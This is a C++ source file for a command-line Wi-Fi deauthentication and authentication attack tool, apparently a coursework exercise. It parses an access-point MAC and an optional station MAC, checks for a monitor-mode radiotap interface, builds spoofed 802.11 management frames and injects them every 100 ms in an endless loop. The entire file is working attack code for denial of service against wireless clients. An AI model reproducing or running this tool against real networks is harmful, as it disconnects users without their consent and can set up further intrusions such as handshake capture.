#include <iostream>
#include <string>
#include <pcap.h>
#include <unistd.h> // usleep
#include "AttackFrame.h"

int main(int argc, char* argv[]) {
    // Usage
    if (argc < 3) {
        std::cerr << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n"
                  << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
        return -1;
    }

    std::string interface = argv[1];
    std::string apStr     = argv[2];

    MacAddr apMac;
    if (!parseMac(apStr, apMac)) {
        std::cerr << "[-] Invalid AP MAC: " << apStr << "\n";
        return -1;
    }

    bool haveStation = false;
    MacAddr stMac;
    bool doAuth = false;

    // Parse optional args
    if (argc >= 4) {
        std::string third = argv[3];
        if (third == "-auth") {
            // broadcast + auth
            doAuth = true;
        } else {
            // station mac
            if (!parseMac(third, stMac)) {
                std::cerr << "[-] Invalid Station MAC: " << third << "\n";
                return -1;
            }
            haveStation = true;

            // 4th param might be "-auth"
            if (argc >= 5) {
                std::string fourth = argv[4];
                if (fourth == "-auth") {
                    doAuth = true;
                }
            }
        }
    }

    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        std::cerr << "pcap_open_live(" << interface << ") failed: " << errbuf << "\n";
        return -1;
    }

    if (pcap_datalink(handle) != DLT_IEEE802_11_RADIO) {
        std::cerr << "[-] Not a Radiotap(802.11) interface. Try enabling monitor mode.\n";
        pcap_close(handle);
        return -1;
    }

    // Print info
    std::cout << "[*] Interface: " << interface << "\n";
    std::cout << "[*] AP MAC: " << (std::string)apMac << "\n";
    if (haveStation)
        std::cout << "[*] Station MAC: " << (std::string)stMac << "\n";
    else
        std::cout << "[*] Station MAC: <broadcast>\n";

    if (doAuth) std::cout << "[*] Attack Type: Authentication\n";
    else        std::cout << "[*] Attack Type: Deauthentication\n";

    static uint8_t packetBuf[128];
    int packetLen = 0;

    bool isBroadcast = (!haveStation);
    bool isDeauth    = (!doAuth);

    // Build mgmt frame
    if (!buildMgmtFrame(packetBuf, packetLen, apMac, stMac, isDeauth, isBroadcast)) {
        std::cerr << "[-] Failed to build mgmt frame\n";
        pcap_close(handle);
        return -1;
    }

    std::cout << "[*] Sending frames...\n";
    while (true) {
        if (pcap_sendpacket(handle, packetBuf, packetLen) != 0) {
            std::cerr << "[!] pcap_sendpacket error: " << pcap_geterr(handle) << "\n";
        }
        // 100ms delay
        usleep(100000);
    }

    pcap_close(handle);
    return 0;
}
